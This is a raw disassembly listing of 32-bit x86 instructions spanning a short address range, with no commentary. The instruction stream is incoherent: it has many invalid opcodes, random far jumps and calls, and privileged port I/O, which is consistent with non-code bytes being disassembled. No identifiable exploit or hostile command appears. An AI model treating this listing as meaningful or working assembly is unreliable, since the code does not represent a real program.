  41c9cd:	xor    BYTE PTR [edx+0x22],ah
  41c9d0:	sbb    DWORD PTR [edi-0x5a517ec7],0x4a
  41c9d7:	mov    al,ds:0x497f6800
  41c9dc:	dec    eax
  41c9dd:	(bad)  
  41c9de:	xor    bl,BYTE PTR [ebx]
  41c9e0:	dec    edx
  41c9e1:	jmp    0x3be500c9
  41c9e6:	mov    cl,0xfc
  41c9e8:	jge    0x41ca02
  41c9ea:	not    BYTE PTR [edx-0x75358ab3]
  41c9f0:	retf   
  41c9f1:	pop    edx
  41c9f2:	ja     0x41ca60
  41c9f4:	cld    
  41c9f5:	xchg   esp,eax
  41c9f6:	inc    ecx
  41c9f7:	rcl    DWORD PTR ds:0x21b970a3,1
  41c9fd:	jl     0x41ca05
  41c9ff:	add    esp,DWORD PTR [esi]
  41ca01:	or     BYTE PTR [esi],0xc5
  41ca04:	rol    DWORD PTR [edi-0x658f2421],0xff
  41ca0b:	mov    esp,0x25e1d65a
  41ca10:	pop    esi
  41ca11:	sub    DWORD PTR [esi-0x4a],0x719db80a
  41ca18:	rol    ebx,0x9a
  41ca1b:	bound  ecx,QWORD PTR [esi+0x40fc9350]
  41ca21:	lock dec ecx
  41ca23:	js     0x41ca45
  41ca25:	test   al,0xd5
  41ca27:	mov    bl,0xcb
  41ca29:	in     al,dx
  41ca2a:	js     0x41ca9e
  41ca2c:	mov    ebx,0xda76f4b0
  41ca31:	out    dx,al
  41ca32:	mov    dh,BYTE PTR cs:[ecx+ebx*1]
  41ca36:	xchg   BYTE PTR [eax],dh
  41ca38:	mov    bh,0x60
  41ca3a:	enter  0xf09e,0xed
  41ca3e:	gs add ax,0x1051
  41ca43:	adc    al,0x7e
  41ca45:	xor    ah,BYTE PTR [edi]
  41ca47:	push   ss
  41ca48:	push   ds
  41ca49:	xchg   ebx,eax
  41ca4a:	push   esp
  41ca4b:	push   ebp
  41ca4c:	je     0x41ca8a
  41ca4e:	dec    esp
  41ca4f:	lock inc edi
  41ca51:	inc    eax
  41ca52:	xor    BYTE PTR [esi+0x73],0xa3
  41ca56:	inc    BYTE PTR [ebp-0x220c3780]
  41ca5c:	ret    
  41ca5d:	pop    ds
  41ca5e:	cwde   
  41ca5f:	mov    esi,DWORD PTR [edi]
  41ca61:	das    
  41ca62:	out    dx,al
  41ca63:	cmp    ecx,DWORD PTR [edi+0x111b857d]
  41ca69:	dec    ebx
  41ca6a:	call   0x10ce2dea
  41ca6f:	cwde   
  41ca70:	nop
  41ca71:	icebp  
  41ca72:	xor    ah,ah
  41ca74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca75:	ret    0x1e6e
  41ca78:	test   esi,esp
  41ca7a:	ja     0x41c9fc
  41ca7c:	mov    ebx,0xee8f469e
  41ca81:	fidivr DWORD PTR [ebx]
  41ca83:	or     eax,0x1ad82f67
  41ca88:	icebp  
  41ca89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca8a:	adc    esp,DWORD PTR [ecx+0x36]
  41ca8d:	imul   BYTE PTR fs:[ebx-0x1c25f967]
  41ca94:	dec    ebp
  41ca95:	sbb    DWORD PTR [edi-0xf],esp
  41ca98:	retf   0x5615
  41ca9b:	sub    eax,0x83295293
  41caa0:	fisttp WORD PTR [ecx+0x3e7746f9]
  41caa6:	xchg   DWORD PTR [eax+0x3aac33a3],esp
  41caac:	cmp    al,0x44
  41caae:	fs ja  0x41ca77
  41cab1:	imul   ebx,DWORD PTR [ebp-0x6108d3c],0x35
  41cab8:	jo     0x41cada
  41caba:	pop    eax
  41cabb:	and    bl,BYTE PTR [eax-0x3879b3b9]
  41cac1:	idiv   BYTE PTR [esi+0x444c9f44]
  41cac7:	adc    eax,esp
  41cac9:	test   al,0xe3
  41cacb:	mov    edi,0x40ed5eb2
  41cad0:	bound  eax,QWORD PTR [esi+0x1af7613c]
  41cad6:	sar    BYTE PTR [ebp+0x4e],1
  41cad9:	enter  0xf337,0x57
  41cadd:	xchg   BYTE PTR [ecx-0x2],bl
  41cae0:	jg     0x41ca79
  41cae2:	and    BYTE PTR ds:0xed4ddd8d,ah
  41cae8:	pop    ebp
  41cae9:	inc    esi
  41caea:	shl    BYTE PTR [esi+0x566718fb],1
  41caf0:	mov    ch,0xad
  41caf2:	mov    ebx,0x43a3689b
  41caf7:	in     al,0x16
  41caf9:	dec    ebx
  41cafa:	or     DWORD PTR [esi],edi
  41cafc:	inc    ebx
  41cafd:	push   ebx
  41cafe:	fnstsw WORD PTR [ebx+edi*2+0x651bfe86]
  41cb05:	xchg   DWORD PTR [ebx],ebx
  41cb07:	mov    cl,0xb8
  41cb09:	gs mov ecx,0xf139d1af
  41cb0f:	jl     0x41cad1
  41cb11:	sub    al,0x62
  41cb13:	test   BYTE PTR [edi+esi*1+0x6c9c8843],bh
  41cb1a:	out    dx,eax
  41cb1b:	cmp    al,BYTE PTR [eax]
  41cb1d:	sbb    al,0xe8
  41cb1f:	mov    eax,ds:0xe7283ca4
  41cb24:	test   BYTE PTR [ecx+ecx*2],ch
  41cb27:	retf   
  41cb28:	mov    WORD PTR [esi+0x7f],ds
  41cb2b:	add    esi,esi
  41cb2d:	sbb    cl,BYTE PTR [edx]
  41cb2f:	mov    eax,ds:0x40997e1a
  41cb34:	stos   BYTE PTR es:[edi],al
  41cb35:	sub    ecx,DWORD PTR [esi-0x54c14277]
  41cb3b:	mov    bh,0x72
  41cb3d:	call   0xd87b76ba
  41cb42:	adc    al,0xe7
  41cb44:	out    dx,al
  41cb45:	xchg   esp,eax
  41cb46:	outs   dx,DWORD PTR ds:[esi]
  41cb47:	(bad)  [edx+0x6e1f0c11]
  41cb4d:	push   ebx
  41cb4e:	je     0x41cb93
  41cb50:	jl     0x41cb79
  41cb52:	push   edi
  41cb53:	cmp    bh,al
  41cb55:	xchg   ecx,eax
  41cb56:	mov    ebx,0x7fe9a199
  41cb5b:	imul   ecx,DWORD PTR ds:[edx-0x2ef08056],0x6e
  41cb63:	fwait
  41cb64:	out    dx,eax
  41cb65:	sub    al,cl
  41cb67:	nop    DWORD PTR [ecx-0x5449ab5]
  41cb6e:	jbe    0x41cba2
  41cb70:	test   BYTE PTR [ecx],dl
  41cb72:	add    al,0x2c
  41cb74:	cmp    edi,DWORD PTR [edx+0x4d042169]
  41cb7a:	mov    ds:0x419adcdb,al
  41cb7f:	mov    ebp,0xea7f1262
  41cb84:	inc    eax
  41cb85:	adc    esi,DWORD PTR [edx]
  41cb87:	jecxz  0x41cbc1
  41cb89:	stos   DWORD PTR es:[edi],eax
  41cb8a:	inc    esi
  41cb8b:	into   
  41cb8c:	dec    ecx
  41cb8d:	mov    ecx,0xe084c0c7
  41cb92:	out    0xfa,al
  41cb94:	shl    BYTE PTR [ebp-0x35],cl
  41cb97:	xor    al,BYTE PTR [ecx-0x77]
  41cb9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb9c:	call   0x3a69:0x73a07d71
  41cba3:	jns    0x41cb6e
  41cba5:	inc    ecx
  41cba6:	mov    ds:0x139cd693,eax
  41cbab:	inc    ebp
  41cbac:	aad    0x5b
  41cbae:	and    eax,0xab283664
  41cbb3:	mov    esp,0xd9e00c38
  41cbb8:	jl     0x41cbef
  41cbba:	cli    
  41cbbb:	add    dl,BYTE PTR [edx+0x13]
  41cbbe:	cs out dx,al
  41cbc0:	pop    edx
  41cbc1:	sub    DWORD PTR [eax-0x7cc1ebe2],ebx
  41cbc7:	into   
  41cbc8:	data16 add al,0xb8
  41cbcb:	call   0xad8c:0x3cb72cc2
  41cbd2:	mov    al,BYTE PTR [ebp+0x31]
  41cbd5:	in     al,0x18
  41cbd7:	dec    esp
  41cbd8:	xchg   edx,eax
  41cbd9:	mov    al,0x5e
  41cbdb:	test   eax,0xe19f45f6
  41cbe0:	(bad)  
  41cbe1:	mov    ecx,0x8dbe680c
  41cbe6:	call   0x1152:0x474634f0
  41cbed:	mov    dl,0x5f
  41cbef:	cmp    DWORD PTR [eax-0x3e],0xffffff81
  41cbf3:	call   0xe5bc:0xecb591d3
  41cbfa:	cmp    DWORD PTR [edx-0x35245ea2],esi
  41cc00:	cmp    ah,dl
  41cc02:	and    DWORD PTR ds:0x6a48b708,0xeb14ea0e
  41cc0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc0d:	fistp  QWORD PTR [esi+0x5cea9f33]
  41cc13:	aaa    
  41cc14:	mov    ds:0x4ba4043b,eax
  41cc19:	sub    DWORD PTR [esi],edx
  41cc1b:	aam    0x92
  41cc1d:	inc    edx
  41cc1e:	test   eax,0x9b49c799
  41cc23:	xor    al,0x26
  41cc25:	(bad)  
  41cc26:	or     eax,0xe1e6fcb7
  41cc2b:	mov    ecx,0xcaee8d9a
  41cc30:	hlt    
  41cc31:	push   ebx
  41cc32:	inc    esp
  41cc33:	mov    ecx,0xbc921386
  41cc38:	and    eax,0x78b820a9
  41cc3d:	(bad)  
  41cc3f:	adc    edx,ecx
  41cc41:	jae    0x41cc5d
  41cc43:	jb     0x41cc1d
  41cc45:	aad    0xf9
  41cc47:	pop    ss
  41cc48:	adc    al,cl
  41cc4a:	xchg   edi,eax
  41cc4b:	test   BYTE PTR [esi-0x6b],0x19
  41cc4f:	ret    
  41cc50:	adc    eax,0x2f040c06
  41cc55:	fs jecxz 0x41cc21
  41cc58:	xchg   ebx,eax
  41cc59:	loop   0x41cc6b
  41cc5b:	leave  
  41cc5c:	push   0xffffff96
  41cc5e:	mov    eax,ds:0xcd546377
  41cc63:	test   eax,ebx
  41cc65:	cmp    al,0xdb
  41cc67:	xchg   DWORD PTR [esi],eax
  41cc69:	rol    edx,cl
  41cc6b:	outs   dx,BYTE PTR ds:[esi]
  41cc6c:	jmp    0x273383bd
  41cc71:	sbb    BYTE PTR [ebx+ebx*8-0x59ff3fc6],dh
  41cc78:	ins    BYTE PTR es:[edi],dx
  41cc79:	scas   al,BYTE PTR es:[edi]
  41cc7a:	jge    0x41ccf4
  41cc7c:	add    cl,BYTE PTR [esi+0x65a7a188]
  41cc82:	dec    esp
  41cc83:	cmc    
  41cc84:	mov    ch,0x91
  41cc86:	repz stc 
  41cc88:	jae    0x41cc5e
  41cc8a:	dec    ebx
  41cc8b:	lods   al,BYTE PTR ds:[esi]
  41cc8c:	adc    DWORD PTR [ebx+0x5586e3d1],ebp
  41cc92:	xor    DWORD PTR [ebx+0x41],edi
  41cc95:	out    0x73,eax
  41cc97:	and    BYTE PTR [edi+esi*8+0x5f],bh
  41cc9b:	or     al,0xba
  41cc9d:	cmc    
  41cc9e:	aas    
  41cc9f:	int3   
  41cca0:	rol    BYTE PTR [edx+0x2ac1ebc7],0x3a
  41cca7:	int3   
  41cca8:	sbb    DWORD PTR [ecx],0xffffff92
  41ccab:	jne    0x41cc9e
  41ccad:	bound  eax,QWORD PTR [edi]
  41ccaf:	cmp    al,0x2a
  41ccb1:	mov    eax,DWORD PTR [ebx+eiz*1+0x6b726731]
  41ccb8:	sbb    WORD PTR [eax-0x56dea1b8],0xfff7
  41ccc0:	and    eax,esi
  41ccc2:	call   0xe46fab87
  41ccc7:	mov    dh,0xf1
  41ccc9:	jecxz  0x41cce0
  41cccb:	mov    edx,0xb26b8997
  41ccd0:	adc    edx,0x2d
  41ccd3:	mov    ss,edi
  41ccd5:	mov    dh,0x38
  41ccd7:	cs mov ecx,0xd85e80fa
  41ccdd:	or     al,0x4a
  41ccdf:	pop    esp
  41cce0:	push   0xe8fdf3d5
  41cce5:	retf   0x9259
  41cce8:	cdq    
  41cce9:	pop    bx
  41cceb:	or     bl,BYTE PTR [ebx+eiz*8]
  41ccee:	mov    edx,0xf5d97a92
  41ccf3:	inc    ebx
  41ccf4:	leave  
  41ccf5:	sbb    BYTE PTR [edx],0x3
  41ccf8:	aaa    
  41ccf9:	dec    esp
  41ccfa:	loopne 0x41cd23
  41ccfc:	gs iret 
  41ccfe:	inc    esi
  41ccff:	icebp  
  41cd00:	or     al,0x97
  41cd02:	cmp    DWORD PTR [ecx+0x674a1251],ecx
  41cd08:	and    al,0x9c
  41cd0a:	lods   al,BYTE PTR ds:[esi]
  41cd0b:	sub    dl,dh
  41cd0d:	cmp    eax,0xfda11b24
  41cd12:	kunpckbw k0,k0,k1
  41cd16:	mov    es:0x627cca28,al
  41cd1c:	xchg   si,ax
  41cd1e:	(bad)  
  41cd1f:	or     al,bh
  41cd21:	outs   dx,DWORD PTR ds:[esi]
  41cd22:	jmp    0xc98c:0xda17f513
  41cd29:	push   edx
  41cd2a:	js     0x41ccb8
  41cd2c:	jecxz  0x41cd88
  41cd2e:	(bad)  
  41cd2f:	fs mov esi,ecx
  41cd32:	out    0xbf,eax
  41cd34:	pop    edx
  41cd35:	jle    0x41cd4d
  41cd37:	cdq    
  41cd38:	and    ebx,DWORD PTR [ecx+0x2269e8a8]
  41cd3e:	pop    eax
  41cd3f:	repz mov bh,0xca
  41cd42:	out    0xd4,eax
  41cd44:	pop    edi
  41cd45:	mov    ch,0xae
  41cd47:	repnz ror DWORD PTR [eax],1
  41cd4a:	or     al,0x3f
  41cd4c:	fadd   DWORD PTR [eax-0x1c4e3677]
  41cd52:	add    edi,ebx
  41cd54:	inc    ebp
  41cd55:	inc    edx
  41cd56:	sub    ch,BYTE PTR [ebx-0x29]
  41cd59:	loopne 0x41cd9d
  41cd5b:	mov    ds:0x591e778f,al
  41cd60:	scas   eax,DWORD PTR es:[edi]
  41cd61:	sub    dh,cl
  41cd63:	ds jmp 0x41cdcd
  41cd66:	pop    ebp
  41cd67:	sbb    DWORD PTR [ebx-0x1b3a4c8e],0xffffffed
  41cd6e:	xchg   esp,eax
  41cd6f:	repnz add eax,0x21bcecbf
  41cd75:	ffreep st(7)
  41cd77:	outs   dx,DWORD PTR ds:[esi]
  41cd78:	mov    bl,0x70
  41cd7a:	jp     0x41cdb4
  41cd7c:	call   0x15a5cb7
  41cd81:	test   eax,0x2c5b1e6a
  41cd86:	pop    edx
  41cd87:	int    0x2c
  41cd89:	mov    dl,0xbc
  41cd8b:	mov    ebx,0x9488d3b5
  41cd90:	jbe    0x41cd2b
  41cd92:	sbb    al,dl
  41cd94:	mov    ecx,0xf5f5e163
  41cd99:	push   ebp
  41cd9a:	cdq    
  41cd9b:	clc    
  41cd9c:	push   eax
  41cd9d:	test   al,0x92
  41cd9f:	and    al,0x28
  41cda1:	xor    dl,ah
  41cda3:	rcr    BYTE PTR [ebp-0x58334ce7],cl
  41cda9:	in     al,dx
  41cdaa:	neg    ebp
  41cdac:	dec    ebx
  41cdad:	nop
  41cdae:	ror    BYTE PTR [esi-0x400d639b],cl
  41cdb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdb5:	cmc    
  41cdb6:	loope  0x41ce14
  41cdb8:	sub    eax,0x86a5a227
  41cdbd:	xor    ah,ch
  41cdbf:	push   0xb7329d80
  41cdc4:	xchg   ecx,eax
  41cdc5:	sahf   
  41cdc6:	cwde   
  41cdc7:	adc    ebx,DWORD PTR ss:[edi+0x51]
  41cdcb:	pop    ecx
  41cdcc:	gs int 0x4
  41cdcf:	dec    edi
  41cdd0:	ss dec ecx
  41cdd2:	xchg   esp,eax
  41cdd3:	call   0xab9:0xf3d0998a
  41cdda:	adc    esi,DWORD PTR [eax]
  41cddc:	push   eax
  41cddd:	mov    dl,0xe8
  41cddf:	push   0xeef6850c
  41cde4:	sub    BYTE PTR [ecx+0x11],al
  41cde7:	ret    
  41cde8:	loope  0x41cd73
  41cdea:	arpl   WORD PTR [ebx+ecx*8+0x3a],cx
  41cdee:	pushf  
  41cdef:	jne    0x41cd78
  41cdf1:	and    bl,cl
  41cdf3:	sub    ebp,ecx
  41cdf5:	jo     0x41cdd6
  41cdf7:	jmp    0xa96d90b1
  41cdfc:	jns    0x41ce00
  41cdfe:	retf   0x73b1
  41ce01:	(bad)  
  41ce02:	mov    ecx,0x30709a95
  41ce07:	inc    edi
  41ce08:	push   eax
  41ce09:	je     0x41cd9c
  41ce0b:	lock jnp 0x41cdfc
  41ce0e:	mov    esp,cs
  41ce10:	or     esp,DWORD PTR [eax]
  41ce12:	pop    esi
  41ce13:	pop    esi
  41ce14:	jmp    0xa320:0x2574cf2
  41ce1b:	inc    edi
  41ce1c:	jmp    0xf1f:0x87e3df0e
  41ce23:	and    al,0x85
  41ce25:	add    ebp,DWORD PTR [ebx+0x71]
  41ce28:	cmp    DWORD PTR [eax-0x3f0869ee],esi
  41ce2e:	jmp    0xb37:0xb62e08e2
  41ce35:	or     edx,edx
  41ce37:	(bad)  
  41ce38:	ins    DWORD PTR es:[edi],dx
  41ce39:	cmp    eax,0x4477760e
  41ce3e:	mov    dh,0x51
  41ce40:	rcl    DWORD PTR [ebp-0x56],cl
  41ce43:	xchg   esi,eax
  41ce44:	dec    eax
  41ce45:	mov    al,0xba
  41ce47:	fst    st(4)
  41ce49:	mov    bl,0x7e
  41ce4b:	push   cs
  41ce4c:	push   ebx
  41ce4d:	or     cl,BYTE PTR [eax+0xe]
  41ce50:	inc    ecx
  41ce51:	xor    dl,BYTE PTR [eax+0x66641594]
  41ce57:	xlat   BYTE PTR ds:[ebx]
  41ce58:	call   0x5a78:0x56142dc8
  41ce5f:	into   
  41ce60:	cdq    
  41ce61:	in     eax,0xa9
  41ce63:	ins    DWORD PTR es:[edi],dx
  41ce64:	cwde   
  41ce65:	das    
  41ce66:	mov    al,0x38
  41ce68:	sbb    BYTE PTR [edx],bl
  41ce6a:	xor    al,0x79
  41ce6c:	(bad)  
  41ce6d:	fcomi  st,st(5)
  41ce6f:	retf   
  41ce70:	mov    dl,0xd3
  41ce72:	ja     0x41ce66
  41ce74:	add    DWORD PTR [eax+edi*8],0x7c
  41ce78:	aad    0x78
  41ce7a:	mov    ecx,0xa4af57e0
  41ce7f:	test   eax,0x8bb43e51
  41ce84:	push   ebp
  41ce85:	jl     0x41cece
  41ce87:	cwde   
  41ce88:	les    esi,FWORD PTR [ebx]
  41ce8a:	nop
  41ce8b:	add    DWORD PTR ds:0x8f40,edx
  41ce90:	xlat   BYTE PTR ds:[ebx]
  41ce91:	scas   al,BYTE PTR es:[edi]
  41ce92:	pop    esp
  41ce93:	ror    DWORD PTR [bx+di+0x711a],1
  41ce98:	in     eax,0x27
  41ce9a:	in     al,dx
  41ce9b:	cmp    eax,0xe2edfad1
  41cea0:	or     al,0x7a
  41cea2:	xchg   DWORD PTR [edx+edx*8],ebp
  41cea5:	sub    ah,BYTE PTR [esp+ecx*4]
  41cea8:	adc    edx,DWORD PTR [edi+0x8daaa63]
  41ceae:	mov    dl,0xb5
  41ceb0:	test   eax,0xaa17e6b3
  41ceb5:	jp     0x41cf32
  41ceb7:	test   esp,edx
  41ceb9:	scas   al,BYTE PTR es:[edi]
  41ceba:	cdq    
  41cebb:	push   0x58
  41cebd:	jg     0x41ce7d
  41cebf:	push   es
  41cec0:	sbb    ch,BYTE PTR [ecx+ebp*4+0x4c]
  41cec4:	fwait
  41cec5:	xchg   esi,eax
  41cec6:	lods   eax,DWORD PTR ds:[esi]
  41cec7:	add    DWORD PTR [esi-0x2c],edx
  41ceca:	daa    
  41cecb:	sub    DWORD PTR [ecx-0x7d394367],0xffffffe4
  41ced2:	add    DWORD PTR [ebx-0x7643215f],edx
  41ced8:	aad    0x4f
  41ceda:	icebp  
  41cedb:	daa    
  41cedc:	popa   
  41cedd:	je     0x41cef5
  41cedf:	das    
  41cee0:	adc    BYTE PTR [ecx],bl
  41cee2:	idiv   bh
  41cee4:	xor    BYTE PTR [esi+0x41a741fc],cl
  41ceea:	xor    esi,DWORD PTR [eax]
  41ceec:	dec    edx
  41ceed:	dec    eax
  41ceee:	mul    DWORD PTR [edx-0x54475cbd]
  41cef4:	sahf   
  41cef5:	pop    edx
  41cef6:	mov    dl,0x95
  41cef8:	jae    0x41cf03
  41cefa:	sbb    eax,0xd8d2bb9a
  41ceff:	ret    
  41cf00:	sub    esp,eax
  41cf02:	and    eax,DWORD PTR [esi+0x78]
  41cf05:	std    
  41cf06:	(bad)  
  41cf07:	fistp  WORD PTR [edi]
  41cf09:	sahf   
  41cf0a:	sbb    DWORD PTR [eax+edi*8],edi
  41cf0d:	or     ch,dl
  41cf0f:	mov    WORD PTR [ecx],ss
  41cf11:	push   ds
  41cf12:	add    al,0x74
  41cf14:	push   0x29524de5
  41cf19:	stos   BYTE PTR es:[edi],al
  41cf1a:	js     0x41cf3c
  41cf1c:	mov    eax,ds:0xe62735a3
  41cf21:	adc    dl,BYTE PTR [esi+0x45]
  41cf24:	sub    al,dl
  41cf26:	mov    ebp,0xf29c31ea
  41cf2b:	xchg   esi,eax
  41cf2c:	loope  0x41cf10
  41cf2e:	mov    eax,0xce6a9c47
  41cf33:	push   edi
  41cf34:	xchg   esi,eax
  41cf35:	xchg   edx,eax
  41cf36:	stos   DWORD PTR es:[edi],eax
  41cf37:	dec    edi
  41cf38:	or     ah,dh
  41cf3a:	jl     0x41cf88
  41cf3c:	clc    
  41cf3d:	sub    BYTE PTR [edi-0x36a14548],ah
  41cf43:	push   edi
  41cf44:	mov    bh,0x72
  41cf46:	nop
  41cf47:	jmp    0x7618:0x848d4ac7
  41cf4e:	dec    esi
  41cf4f:	ret    
  41cf50:	xchg   ebp,eax
  41cf51:	arpl   sp,cx
  41cf53:	adc    eax,0x481e1f10
  41cf58:	and    ebp,DWORD PTR [eax-0x428595d]
  41cf5e:	je     0x41cfa8
  41cf60:	out    dx,eax
  41cf61:	fst    QWORD PTR [edx+eiz*2-0x40]
  41cf65:	dec    ebp
  41cf66:	and    BYTE PTR [esi+0x70132b7a],0x2e
  41cf6d:	lods   al,BYTE PTR ds:[esi]
  41cf6e:	iret   
  41cf6f:	test   DWORD PTR [ecx+0x70],0xb3aa399b
  41cf76:	pop    esp
  41cf77:	pop    edi
  41cf78:	jmp    0xa2ab:0xf5aa2b2c
  41cf7f:	int    0x52
  41cf81:	cli    
  41cf82:	mov    al,ds:0xb3324181
  41cf87:	and    edi,DWORD PTR [eax+0x6]
  41cf8a:	add    eax,0xc06ad28
  41cf8f:	leave  
  41cf90:	adc    esi,DWORD PTR [ebx+eiz*1]
  41cf93:	add    ebp,DWORD PTR [esi+esi*4-0x30]
  41cf97:	jp     0x41cf8e
  41cf99:	adc    eax,0x8ba8c449
  41cf9e:	dec    esi
  41cf9f:	xor    al,BYTE PTR [ebp+0x17afecdc]
  41cfa5:	mov    cl,0xfc
  41cfa7:	sub    edx,edx
  41cfa9:	(bad)  
  41cfaa:	push   ebp
  41cfab:	sahf   
  41cfac:	shl    edx,1
  41cfae:	out    dx,eax
  41cfaf:	pop    ebx
  41cfb0:	xor    eax,0xae2d3e0f
  41cfb5:	enter  0x380d,0x75
  41cfb9:	mov    bl,0xb1
  41cfbb:	std    
  41cfbc:	dec    edx
  41cfbd:	clc    
  41cfbe:	jle    0x41d02c
  41cfc0:	mov    edx,0x57ac7514
  41cfc5:	into   
  41cfc6:	lods   al,BYTE PTR ds:[esi]
  41cfc7:	fcom   QWORD PTR [ebx+0x3e]
  41cfca:	push   ebx
  41cfcb:	mov    ah,0xe4
  41cfcd:	mov    ah,0x30
  41cfcf:	loopne 0x41d004
  41cfd1:	icebp  
  41cfd2:	jae    0x41d03c
  41cfd4:	mov    WORD PTR [esi+0x19],ss
  41cfd7:	fldenv [ebx+0x357fd3ae]
  41cfdd:	popa   
  41cfde:	bound  ecx,QWORD PTR [edi]
  41cfe0:	les    esi,FWORD PTR [ebx]
  41cfe2:	mov    edi,0x8e18fb73
  41cfe7:	call   0xa26cdfa0
  41cfec:	ins    BYTE PTR es:[edi],dx
  41cfed:	jge    0x41cfe7
  41cfef:	pop    ss
  41cff0:	call   0xa6be:0x474003eb
  41cff7:	js     0x41d03e
  41cff9:	pusha  
  41cffa:	cdq    
  41cffb:	add    eax,0x5c441a25
  41d000:	add    ch,BYTE PTR [ecx]
  41d002:	push   edx
  41d003:	stc    
  41d004:	call   0x79a25e3c
  41d009:	sahf   
  41d00a:	int3   
  41d00b:	adc    eax,0x1f19e79a
  41d010:	sbb    al,0x68
  41d012:	push   0xffffff91
  41d014:	loopne 0x41d08d
  41d016:	xchg   esp,eax
  41d017:	push   0xe2b05226
  41d01c:	adc    eax,0xfb5436d0
  41d021:	xchg   ebp,eax
  41d022:	adc    esp,edx
  41d024:	lods   eax,DWORD PTR ds:[esi]
  41d025:	fld    DWORD PTR [ebx]
  41d027:	adc    edi,DWORD PTR gs:[edi-0x7a234f6d]
  41d02e:	ja     0x41cfc6
  41d030:	and    al,0xe5
  41d032:	in     al,dx
  41d033:	inc    esi
  41d034:	frstor ds:[ebx-0x79]
  41d038:	pop    ss
  41d039:	test   al,0x77
  41d03b:	sbb    ah,cl
  41d03d:	cmp    ch,BYTE PTR [edx-0x30]
  41d040:	stc    
  41d041:	lds    esi,FWORD PTR [ebp+0x274d8757]
  41d047:	lea    ebx,[edi+0x9]
  41d04a:	pop    edi
  41d04b:	sbb    eax,0xa58cd7f7
  41d050:	push   ds
  41d051:	scas   eax,DWORD PTR es:[edi]
  41d052:	mul    BYTE PTR [ebp-0x9a2bc55]
  41d058:	rcr    BYTE PTR [ecx+0x2f],0xa1
  41d05c:	push   ebx
  41d05d:	mov    eax,0x7e83a90f
  41d062:	cmp    ebp,eax
  41d064:	push   ss
  41d065:	scas   al,BYTE PTR es:[edi]
  41d066:	outs   dx,BYTE PTR ds:[si]
  41d068:	xor    edi,DWORD PTR [ecx+0x56ee3a0d]
  41d06e:	dec    edi
  41d06f:	scas   eax,DWORD PTR es:[edi]
  41d070:	jo     0x41d0d2
  41d072:	in     eax,dx
  41d073:	loope  0x41d045
  41d075:	sar    DWORD PTR [edi+ebp*1-0x5f4d752b],0xfc
  41d07d:	jle    0x41d080
  41d07f:	add    eax,0xcf12df00
  41d084:	idiv   bl
  41d086:	and    ch,BYTE PTR [edi+0x6dea4aa2]
  41d08c:	adc    al,0xf2
  41d08e:	pop    es
  41d08f:	in     al,0xca
  41d091:	xor    edi,DWORD PTR [esi+0x7e329be0]
  41d097:	call   0x5cd:0xc8a800eb
  41d09e:	adc    esp,ebp
  41d0a0:	retf   
  41d0a1:	mov    bh,0x4c
  41d0a3:	int3   
  41d0a4:	(bad)  
  41d0a6:	or     eax,0x11d9990e
  41d0ab:	aaa    
  41d0ac:	mov    eax,ds:0x4c2aafb
  41d0b1:	das    
  41d0b2:	and    DWORD PTR [ecx+0x14367e29],0xffffffaa
  41d0b9:	cmp    eax,0x1b9e5d28
  41d0be:	imul   ebp,DWORD PTR [esi-0x6e],0x32fc1b2d
  41d0c5:	sbb    al,0x8f
  41d0c7:	into   
  41d0c8:	cwde   
  41d0c9:	push   0xfffffff6
  41d0cb:	mov    bh,0x3d
  41d0cd:	mov    edi,esi
  41d0cf:	shl    DWORD PTR [esi-0x28],0x80
  41d0d3:	test   al,0x20
  41d0d5:	sbb    BYTE PTR [ecx-0x26],0xe8
  41d0d9:	push   ds
  41d0da:	xchg   edx,eax
  41d0db:	and    DWORD PTR ds:0x6fecbb72,0x9c6d2578
  41d0e5:	pop    esi
  41d0e6:	push   esp
  41d0e7:	inc    edx
  41d0e8:	inc    esi
  41d0e9:	dec    ebp
  41d0ea:	adc    ebp,edx
  41d0ec:	or     eax,0x87326389
  41d0f1:	js     0x41d163
  41d0f3:	sub    ebx,DWORD PTR [ebx-0x6a]
  41d0f6:	pop    es
  41d0f7:	sqrtps xmm7,xmm7
  41d0fa:	sub    eax,0x305ef4ba
  41d0ff:	fisttp DWORD PTR [ecx+0x25]
  41d102:	pop    es
  41d103:	loopne 0x41d12f
  41d105:	add    al,0x48
  41d107:	mov    cl,0x63
  41d109:	fisub  DWORD PTR [eax+0x79cd7fcd]
  41d10f:	sub    BYTE PTR [ebp-0x4a8be5af],cl
  41d115:	rcl    BYTE PTR gs:[ebx],0x44
  41d119:	scas   eax,DWORD PTR es:[edi]
  41d11a:	or     al,0xca
  41d11c:	in     al,dx
  41d11d:	in     eax,dx
  41d11e:	and    eax,0xfa8c95cc
  41d123:	push   eax
  41d124:	les    edi,FWORD PTR [edx+0x72]
  41d127:	aaa    
  41d128:	jecxz  0x41d118
  41d12a:	adc    al,0x48
  41d12d:	jmp    0x9131:0xf430e0e6
  41d134:	neg    BYTE PTR [ebp-0x4a210a30]
  41d13a:	mov    esp,ecx
  41d13c:	ret    0x45bd
  41d13f:	xchg   edi,eax
  41d140:	xlat   BYTE PTR ds:[ebx]
  41d141:	ins    BYTE PTR es:[edi],dx
  41d142:	mov    ds:0x991c210d,eax
  41d147:	add    eax,0x6b471cb7
  41d14c:	jbe    0x41d193
  41d14e:	xor    ecx,DWORD PTR [edx+ebx*2+0x31a09f64]
  41d155:	inc    edx
  41d156:	imul   esp,DWORD PTR [eax],0x8cb2d87c
  41d15c:	inc    ebx
  41d15d:	and    DWORD PTR [ecx-0x98ebb71],ecx
  41d163:	dec    eax
  41d164:	mov    edx,0x7fc1b696
  41d169:	test   DWORD PTR [ebp+0x15],edi
  41d16c:	inc    ebx
  41d16d:	add    ecx,DWORD PTR [ecx+0x6f]
  41d170:	push   ebp
  41d171:	iret   
  41d172:	call   0xf86d:0x3f0fb5e
  41d179:	sub    al,0x15
  41d17b:	sahf   
  41d17c:	jb     0x41d147
  41d17e:	xchg   esp,eax
  41d17f:	out    dx,al
  41d180:	ins    BYTE PTR es:[edi],dx
  41d181:	sbb    eax,DWORD PTR [edi-0x6652c4a3]
  41d187:	cwde   
  41d188:	xchg   BYTE PTR [eax-0x34],bl
  41d18b:	aad    0x68
  41d18d:	xchg   esp,eax
  41d18e:	iret   
  41d18f:	rcr    dl,cl
  41d191:	fidiv  WORD PTR [ebp+eax*1-0x43]
